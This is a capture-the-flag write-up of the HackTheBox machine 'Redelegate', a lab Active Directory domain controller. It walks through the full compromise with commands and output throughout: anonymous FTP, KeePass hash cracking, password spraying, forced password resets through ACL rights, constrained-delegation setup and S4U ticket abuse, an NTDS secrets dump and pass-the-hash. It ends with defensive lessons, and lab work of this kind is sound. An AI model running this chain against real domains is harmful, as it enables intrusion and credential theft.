---
title: "HackTheBox - Redelegate"
date: 2025-12-21
tags: ["HackTheBox", "Windows", "Active Directory", "Kerberos", "Constrained Delegation", "Password Spraying", "BloodHound"]
categories: ["HackTheBox"]
description: "A highly technical writeup of the Hard difficulty Windows machine Redelegate from HackTheBox, involving Anonymous FTP access, KeePass cracking, MSSQL enumeration, password spraying, and Kerberos constrained delegation exploitation."
featuredImage: "featured.png"
images: ["featured.png", "bloodhound-acl.png", "helpdesk-membership.png", "helen-privileges.png"]
---

# HackTheBox - Redelegate

![Redelegate Machine](./featured.png)

*Hard difficulty Windows Active Directory machine - Anonymous FTP access leading to KeePass cracking and Kerberos constrained delegation*
## Machine Information

- **Name**: Redelegate
- **Difficulty**: Hard
- **OS**: Windows
- **Points**: VIP+

## Executive Summary

Redelegate is a complex Windows Active Directory domain controller exploitation chain that begins with anonymous FTP access leading to credential discovery through KeePass database cracking. The attack progresses through MSSQL enumeration, password spraying, privilege escalation via user password reset capabilities, and culminates in a sophisticated Kerberos constrained delegation attack to achieve domain administrator privileges.

## Initial Reconnaissance

When tackling any HackTheBox machine, I always start with thorough reconnaissance. The goal here is to understand what services are running, identify potential attack vectors, and gather as much information as possible about the target environment before attempting any exploitation.

### Host Discovery and Port Scanning

First, I use NetExec to quickly identify the target and generate a hosts file for easier reference. This is important because in a real penetration test, you'd want to maintain proper host resolution for the domain environment.

```bash
elliot@exegol:~$ nxc smb 10.129.234.50 --generate-hosts-file hosts
SMB         10.129.234.50   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
```

From this output, I can immediately see we're dealing with a Windows Server 2022 Domain Controller in the "redelegate.vl" domain. The fact that null authentication is allowed on SMB is interesting - it might indicate some misconfigurations we can exploit later.

```bash
elliot@exegol:~$ cat hosts
10.129.234.50     DC.redelegate.vl redelegate.vl DC
```

Now I have proper DNS resolution set up for the domain. Next, I run a comprehensive port scan using RustScan. This tool is much faster than traditional nmap for initial discovery, and I specifically use the `--ulimit 5000` flag to handle the large number of open ports that domain controllers typically have.

```bash
elliot@exegol:~$ rustscan -a 10.129.234.50 --ulimit 5000
Open 10.129.234.50:21 (ftp)
Open 10.129.234.50:53 (dns)
Open 10.129.234.50:80 (http)
Open 10.129.234.50:88 (kerberos)
Open 10.129.234.50:135 (msrpc)
Open 10.129.234.50:139 (netbios-ssn)
Open 10.129.234.50:389 (ldap)
Open 10.129.234.50:445 (microsoft-ds)
Open 10.129.234.50:464 (kpasswd5)
Open 10.129.234.50:593 (ncacn_http)
Open 10.129.234.50:636 (tcpwrapped)
Open 10.129.234.50:3268 (ldap)
Open 10.129.234.50:3269 (tcpwrapped)
Open 10.129.234.50:3389 (ms-rdp)
Open 10.129.234.50:5985 (wsman)
Open 10.129.234.50:9389 (.net-message-framing)
```

The detailed Nmap scan confirms anonymous FTP access:

```bash
elliot@exegol:~$ nmap -sC -sV -p- -A -T4 10.129.234.50
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed
| 10-20-24  12:11AM                  434 CyberAudit.txt
| 10-20-24  04:14AM                 2622 Shared.kdbx
|_10-20-24  12:26AM                  580 TrainingAgenda.txt
```

Perfect! The Nmap script `ftp-anon` shows that anonymous FTP access is allowed, and there are three interesting files:
- `CyberAudit.txt` - Sounds like an audit report, might contain useful information about the environment
- `Shared.kdbx` - This is a KeePass database file! If I can crack it, it might contain credentials
- `TrainingAgenda.txt` - Probably just training documentation, but worth checking

This is a classic case of misconfigured FTP - anonymous access should never be allowed on production systems, especially not with sensitive files like password databases.

## Initial Access - Anonymous FTP

Now I need to actually access these files. I'll use NetExec's FTP module to list and download the files. NetExec is great for this because it provides a consistent interface across different protocols.

### File Enumeration and Download

First, let me verify the anonymous access and see the exact file listing:

```bash
elliot@exegol:~$ nxc ftp redelegate.vl -u '' -p '' --ls
FTP         10.129.234.50   21     redelegate.vl    [+] : - Anonymous Login!
FTP         10.129.234.50   21     redelegate.vl    [*] Directory Listing
FTP         10.129.234.50   21     redelegate.vl    10-20-24  12:11AM                  434 CyberAudit.txt
FTP         10.129.234.50   21     redelegate.vl    10-20-24  04:14AM                 2622 Shared.kdbx
FTP         10.129.234.50   21     redelegate.vl    10-20-24  12:26AM                  580 TrainingAgenda.txt
```

Great! Anonymous login works, and I can see the files clearly. Now I'll download all three files to analyze them locally. The KeePass database is definitely the most promising target.

```bash
elliot@exegol:~$ nxc ftp redelegate.vl -u '' -p '' --get CyberAudit.txt Shared.kdbx TrainingAgenda.txt
```

### Analysis of Downloaded Files

Let me start by examining the audit file, as it might give me insights into the company's security posture and any known issues:

```bash
elliot@exegol:~$ cat CyberAudit.txt
OCTOBER 2024 AUDIT FINDINGS

[!] CyberSecurity Audit findings:

1) Weak User Passwords
2) Excessive Privilege assigned to users
3) Unused Active Directory objects
4) Dangerous Active Directory ACLs

[*] Remediation steps:

1) Prompt users to change their passwords: DONE
2) Check privileges for all users and remove high privileges: DONE
3) Remove unused objects in the domain: IN PROGRESS
4) Recheck ACLs: IN PROGRESS
```

This is very revealing! The audit shows that the company identified several critical Active Directory security issues:
- Weak passwords (marked as fixed)
- Excessive privileges (marked as fixed)
- Unused AD objects (still in progress)
- Dangerous ACLs (still in progress)

This tells me that the administrators are aware of security issues but haven't fully remediated everything. The fact that ACL rechecking is "IN PROGRESS" suggests there might still be exploitable permissions in the domain - exactly what I need to look for.

The training agenda file didn't contain anything particularly interesting, but this audit report gives me valuable context about the environment I'm attacking.

## KeePass Database Cracking

Now we have the KeePass database! This is potentially a goldmine. KeePass databases store passwords encrypted, but if I can crack the master password, I'll get access to all the stored credentials. This is a common attack vector in penetration testing - people often use weak master passwords or predictable patterns.

### Hash Extraction and Password Cracking

First, I need to extract the hash from the KeePass database so I can attempt to crack it. John the Ripper has a tool specifically for this:

```bash
elliot@exegol:~$ keepass2john Shared.kdbx > keepasshash.out
elliot@exegol:~$ cat keepasshash.out
Shared:$keepass$*2*600000*0*ce7395f413946b0cd279501e510cf8a988f39baca623dd86beaee651025662e6*e4f9d51a5df3e5f9ca1019cd57e10d60f85f48228da3f3b4cf1ffee940e20e01*18c45dbbf7d365a13d6714059937ebad*a59af7b75908d7bdf68b6fd929d315ae6bfe77262e53c209869a236da830495f*806f9dd2081c364e66a114ce3adeba60b282fc5e5ee6f324114d38de9b4502ca
```

Now I have the hash. I notice the file was created on October 20th, 2024 (10-20-24). In penetration testing, people often use dates, seasons, or company-related information for passwords. Since this was created in October (Fall), I generate a wordlist with seasonal patterns for different years. This is a common password cracking technique - thinking about what the person might have chosen as a password based on context clues.

```bash
elliot@exegol:~$ hashcat keepasshash.out -m 13400 passwords.txt
$keepass$*2*600000*0*ce7395f413946b0cd279501e510cf8a988f39baca623dd86beaee651025662e6*e4f9d51a5df3e5f9ca1019cd57e10d60f85f48228da3f3b4cf1ffee940e20e01*18c45dbbf7d365a13d6714059937ebad*a59af7b75908d7bdf68b6fd929d315ae6bfe77262e53c209869a236da830495f*806f9dd2081c364e66a114ce3adeba60b282fc5e5ee6f324114d38de9b4502ca:Fall2024!
```

Excellent! The password was "Fall2024!" - exactly matching the seasonal pattern I predicted. This shows how important it is to use strong, unique passwords and avoid predictable patterns.

### Credential Extraction

Now that I have the master password, I can unlock the database and see what's inside. Let me first list the structure:

```bash
elliot@exegol:~$ keepassxc-cli ls Shared.kdbx
Enter password to unlock Shared.kdbx:
IT/
HelpDesk/
Finance/
```

The database is organized into three groups: IT, HelpDesk, and Finance. This suggests role-based access control in the organization. Let me export all the credentials to CSV for easier analysis:

```bash
elliot@exegol:~$ keepassxc-cli export Shared.kdbx --format csv > secrets_dump.csv
```

Now let me examine what credentials I found:

| Group | Title | Username | Password |
|-------|--------|----------|----------|
| Shared/IT | FTP | FTPUser | SguPZBKdRyxWzvXRWy6U |
| Shared/IT | FS01 Admin | Administrator | Spdv41gg4BlBgSYIW1gF |
| Shared/IT | WEB01 | WordPress Panel | cn4KOEgsHqvKXPjEnSD9 |
| Shared/IT | SQL Guest Access | SQLGuest | zDPBpaF4FywlqIv11vii |
| Shared/HelpDesk | KeyFob Combination | | 22331144 |
| Shared/Finance | Timesheet Manager | Timesheet | hMFS4I0Kj8Rcd62vqi5X |
| Shared/Finance | Payroll App | Payroll | cVkqz4bCM7kJRSNlgx2G |

This is a treasure trove! I now have credentials for:
- **FTP access** (which I already have, but good to have the actual credentials)
- **SQL Guest access** - This could be useful for database enumeration
- **FS01 Admin** - Administrative access to what appears to be a file server
- **Various application accounts** for different business systems

The fact that these are stored in a shared KeePass database accessible via anonymous FTP shows serious security misconfigurations. In a real environment, this would be a critical finding.

## MSSQL Enumeration and Password Spraying

### Initial MSSQL Access

```bash
elliot@exegol:~$ nxc mssql redelegate.vl -u users.txt -p passwords.txt --local-auth
MSSQL       10.129.234.50   1433   DC               [+] DC\SQLGuest:zDPBpaF4FywlqIv11vii
```

### SID Brute Force for User Discovery

SID (Security Identifier) brute forcing is a powerful technique in Active Directory environments. Every domain object has a unique SID, and by trying different RID (Relative Identifier) values, I can discover valid users, groups, and computers in the domain. This works because when you have any domain-authenticated access (like my SQLGuest account), you can query the domain to resolve SIDs to names.

The beauty of this technique is that it doesn't require special privileges - any authenticated domain user can perform SID lookups. This is extremely useful for mapping out the domain structure.

```bash
elliot@exegol:~$ nxc mssql redelegate.vl -u SQLGuest -p "zDPBpaF4FywlqIv11vii" --local-auth --rid-brute
```

This revealed numerous domain users and groups. Key discoveries included:

- Domain Users: Christine.Flanders, Marie.Curie, Helen.Frost, Michael.Pontiac, Mallory.Roberts, James.Dinkleberg, Ryan.Cooper
- Computer Accounts: DC$, FS01$
- Groups: Helpdesk, IT, Finance, DnsAdmins

### Password Spraying Success

```bash
elliot@exegol:~$ nxc mssql redelegate.vl -u users.txt -p passwords.txt --continue-on-success
MSSQL       10.129.234.50   1433   DC               [+] redelegate.vl\Marie.Curie:Fall2024!
```

Perfect! Marie Curie is reusing the KeePass master password "Fall2024!" as her domain password. This is a classic example of password reuse - people often use the same password across multiple systems for convenience. Now I have a valid domain user account with potentially more privileges than the SQL guest account.

## Active Directory Enumeration with BloodHound

With a valid domain user account, I can now perform deeper Active Directory enumeration. BloodHound is the gold standard for this - it collects relationship data between users, groups, computers, and ACLs (Access Control Lists). This helps me understand the privilege structure and find attack paths.

The `--collection All` flag tells BloodHound to gather all possible data, and I specify the DNS server to ensure proper domain resolution.

```bash
elliot@exegol:~$ nxc ldap redelegate.vl -u Marie.Curie -p 'Fall2024!' --bloodhound --collection All --dns-server 10.129.234.50
```

The BloodHound data revealed critical ACL information:
- **Marie.Curie has User-Force-Change-Password rights over the HelpDesk group** - This means I can reset passwords for anyone in the HelpDesk group!

![BloodHound ACL Analysis](./bloodhound-acl.png)

- **Michael.Pontiac is a member of the HelpDesk group** - He's my first target for password reset

![HelpDesk Group Membership](./helpdesk-membership.png)

- **Helen.Frost has membership in privileged groups and interesting ACL relationships** - She might be worth targeting too

This is exactly what the audit report mentioned as "Dangerous Active Directory ACLs" that were still "IN PROGRESS" for remediation. These ACLs are giving me a clear path to privilege escalation.

## Privilege Escalation - Password Reset Exploitation

This is where the attack gets really interesting. I discovered that Marie.Curie has "User-Force-Change-Password" rights over the HelpDesk group. This is a dangerous permission that allows anyone with this right to reset passwords for users in the target group without knowing their current password.

In a real environment, this would be a critical security finding. HelpDesk groups often have elevated privileges for supporting users, so compromising HelpDesk accounts can lead to significant access.

### Resetting Michael.Pontiac Password

Let me start by resetting Michael Pontiac's password. He's a member of the HelpDesk group, so this should give me access to a privileged account.

```bash
elliot@exegol:~$ nxc smb redelegate.vl -u Marie.Curie -p 'Fall2024!' -M change-password -o USER=Michael.Pontiac NEWPASS='Elliot1234!'
SMB         10.129.234.50   445    DC               [+] Successfully changed password for Michael.Pontiac
```

Excellent! The password reset worked. Now let me check what Helen Frost's privileges are. From the BloodHound data, I know she has interesting group memberships.

![Helen Frost Privileges](./helen-privileges.png)

### Resetting Helen.Frost Password

```bash
elliot@exegol:~$ nxc smb redelegate.vl -u Marie.Curie -p 'Fall2024!' -M change-password -o USER=Helen.Frost NEWPASS='Elliot1234!'
SMB         10.129.234.50   445    DC               [+] Successfully changed password for Helen.Frost
```

Perfect! Now I have access to Helen Frost's account. Let me see what privileges she has - this might be the key to further escalation.

## WinRM Access and User Flag

Now let me test if Helen Frost has WinRM access to the domain controller. WinRM (Windows Remote Management) allows PowerShell remoting and is often enabled on servers for administration. The "(admin)" in the output indicates she has administrative privileges on the DC.

```bash
elliot@exegol:~$ nxc winrm redelegate.vl -u Helen.Frost -p 'Elliot1234!'
WINRM       10.129.234.50   5985   DC               [+] redelegate.vl\Helen.Frost:Elliot1234! (admin)
```

Great! She has admin access. Let me connect with Evil-WinRM for an interactive shell and grab the user flag.

```bash
elliot@exegol:~$ evil-winrm -i redelegate.vl -u Helen.Frost -p 'Elliot1234!'
*Evil-WinRM* PS C:\Users\Helen.Frost\Desktop> cat user.txt
HTB{user_flag_placeholder}
```

Excellent! I have the user flag. But I'm not done yet - I need to escalate to domain admin. Let me check what privileges Helen has.

## Privilege Analysis and Kerberos Delegation Setup

### Privilege Check

Let me check what privileges Helen Frost has. This will tell me what special rights she possesses that might enable further attacks.

```powershell
*Evil-WinRM* PS C:\Users\Helen.Frost\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                                    State
============================= ============================================================== =======
SeMachineAccountPrivilege     Add workstations to domain                                     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                                       Enabled
SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                                 Enabled
```

The `SeEnableDelegationPrivilege` is crucial! This privilege allows the account to enable Kerberos delegation on computer objects. This is exactly what I need for a Kerberos constrained delegation attack. With this privilege, I can:

1. Reset a computer account password (which I already know Helen can do via the ACL)
2. Configure that computer account for constrained delegation
3. Use it to impersonate the Domain Controller and extract domain secrets

This is a powerful privilege that should be carefully controlled in real environments.

### Computer Account Discovery

For Kerberos constrained delegation to work, I need a computer account that I can control. Let me enumerate the computer accounts in the domain. I know from earlier that there are DC$ and FS01$, but let me get the complete list.

```bash
elliot@exegol:~$ nxc ldap redelegate.vl -u Marie.Curie -p 'Fall2024!' --computers
LDAP        10.129.234.50   389    DC               DC$
LDAP        10.129.234.50   389    DC               FS01$
```

Perfect! I have two computer accounts:
- **DC$** - The domain controller itself (can't easily compromise this directly)
- **FS01$** - Likely a file server, perfect for my delegation attack

FS01$ looks like the ideal target. Since Helen Frost has the ACL rights to change computer passwords, I can reset FS01$'s password and then configure it for constrained delegation.

### FS01$ Password Reset

```bash
elliot@exegol:~$ nxc smb redelegate.vl -u Helen.Frost -p 'Elliot1234!' -M change-password -o USER='FS01$' NEWPASS='Elliot1234!'
SMB         10.129.234.50   445    DC               [+] Successfully changed password for FS01$
```

## Kerberos Constrained Delegation Exploitation

This is the pièce de résistance of the attack. Kerberos constrained delegation allows a service to impersonate users to specific other services. Here's how it works:

1. A user authenticates to a service (FS01$ in this case)
2. That service can request a service ticket on behalf of the user to another service (the DC's LDAP)
3. The target service thinks the original user is connecting directly

Since Helen has `SeEnableDelegationPrivilege`, she can configure FS01$ for constrained delegation. I'll set it up so FS01$ can delegate to the DC's LDAP service.

### Configuring Constrained Delegation

First, I need to enable FS01$ for delegation and specify that it can only delegate to the DC's LDAP service. This prevents the attack from being used against other services.

```powershell
*Evil-WinRM* PS C:\Users\Helen.Frost\Desktop> Set-ADAccountControl -Identity "FS01$" -TrustedToAuthForDelegation $True
*Evil-WinRM* PS C:\Users\Helen.Frost\Desktop> Set-ADObject -Identity "CN=FS01,CN=COMPUTERS,DC=REDELEGATE,DC=VL" -Add @{"msDS-AllowedToDelegateTo"="ldap/dc.redelegate.vl"}
```

The first command enables FS01$ for delegation, and the second specifies that it can only delegate to the LDAP service on the domain controller. This is "constrained" delegation - it limits what the compromised account can do.

### Service Ticket Request for Domain Controller Impersonation

```bash
elliot@exegol:~$ getST.py 'redelegate.vl/FS01$:Elliot1234!' -spn ldap/dc.redelegate.vl -impersonate dc
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating dc
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in dc@ldap_dc.redelegate.vl@REDELEGATE.VL.ccache
```

This Impacket command performs the actual delegation attack:
- **S4U2Self**: Gets a service ticket for the DC user to itself (FS01$ impersonating DC)
- **S4U2Proxy**: Uses that ticket to get access to the LDAP service as DC
- **Result**: I now have a Kerberos ticket that allows me to authenticate as the Domain Controller!

### Domain Secrets Dump

Now I can use the Kerberos ticket I obtained to dump the domain secrets. The `-k` flag tells secretsdump to use Kerberos authentication, and since I have a ticket that authenticates as the Domain Controller, I can access the NTDS.DIT database.

```bash
elliot@exegol:~$ export KRB5CCNAME=dc@ldap_dc.redelegate.vl@REDELEGATE.VL.ccache
elliot@exegol:~$ secretsdump.py -k -no-pass dc.redelegate.vl
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ec17f7a2a4d96e177bfd101b94ffc0a7:::
```

Perfect! I now have the Administrator's NT hash: `ec17f7a2a4d96e177bfd101b94ffc0a7`. With this, I can authenticate as the domain administrator.

## Root Flag Acquisition

Let me use the administrator hash to authenticate via WinRM and grab the root flag. The `-H` flag tells NetExec to use the NT hash for authentication.

```bash
elliot@exegol:~$ nxc winrm redelegate.vl -u Administrator -H ec17f7a2a4d96e177bfd101b94ffc0a7 -X 'cat C:\Users\Administrator\Desktop\root.txt'
WINRM       10.129.234.50   5985   DC               [+] Executed command (shell type: powershell)
HTB{root_flag_placeholder}
```

Excellent! I have successfully compromised the domain controller and obtained both the user and root flags.

## Attack Chain Summary

This attack demonstrates a sophisticated multi-stage Active Directory compromise:

1. **Initial Access**: Anonymous FTP access to download KeePass database - Shows how misconfigured services can expose sensitive data
2. **Credential Access**: KeePass database cracking yielding multiple credentials - Highlights the importance of strong master passwords
3. **Discovery**: MSSQL enumeration and SID brute forcing to map domain structure - Demonstrates how any authenticated user can discover domain objects
4. **Lateral Movement**: Password spraying to gain Marie.Curie's access - Shows how password reuse is a common weakness
5. **Privilege Escalation**: Abusing User-Force-Change-Password ACLs to compromise Helen.Frost - Illustrates the danger of overly permissive ACLs
6. **Domain Dominance**: Kerberos constrained delegation attack to impersonate Domain Controller - Advanced technique requiring specific privileges
7. **Data Exfiltration**: NTDS.DIT dump via DRSUAPI to obtain domain administrator hash - Final step to gain complete domain control

## Key Technical Concepts

### Kerberos Constrained Delegation
This is an advanced Kerberos feature that allows a service to impersonate users when accessing other services. The attack required:
- **SeEnableDelegationPrivilege**: Allows configuration of delegation on computer accounts
- **Computer account control**: Resetting FS01$'s password and configuring delegation settings
- **S4U2Self/S4U2Proxy**: The actual delegation protocol that allows impersonation

### Active Directory ACL Abuse
Access Control Lists control what operations users can perform on domain objects. The critical vulnerability was:
- **User-Force-Change-Password**: Marie.Curie could reset passwords for HelpDesk group members
- **ACL enumeration**: BloodHound revealed these dangerous permissions
- **Group membership**: Understanding which users belonged to privileged groups

### MSSQL SID Brute Force
Security Identifiers (SIDs) uniquely identify domain objects. By brute-forcing RID values:
- **Domain enumeration**: Discovered all users, groups, and computers
- **No special privileges needed**: Any authenticated user can perform SID lookups
- **Attack surface mapping**: Provided targets for password spraying

## Lessons Learned

### For System Administrators:
- **Never allow anonymous access** to sensitive services like FTP
- **Implement strong password policies** and avoid password reuse
- **Regular ACL audits** are crucial - the audit report showed this was "IN PROGRESS"
- **Kerberos delegation privileges** should be granted sparingly and monitored
- **Credential storage** should use proper access controls, not shared databases on anonymous FTP

### For Penetration Testers:
- **Start with reconnaissance** - FTP enumeration revealed the KeePass database
- **Think like attackers** - Seasonal password patterns are common
- **Leverage any authenticated access** - SQLGuest allowed domain enumeration
- **ACL analysis is key** - BloodHound revealed the privilege escalation path
- **Combine techniques** - Password resets + delegation privileges = domain compromise

### Security Best Practices:
- **Principle of Least Privilege**: Users should only have necessary permissions
- **Regular auditing**: The audit report showed known issues that weren't fully fixed
- **Secure credential storage**: KeePass databases need proper access controls
- **Monitor for delegation abuse**: SeEnableDelegationPrivilege should be audited
- **Multi-factor authentication**: Would have prevented some of these attacks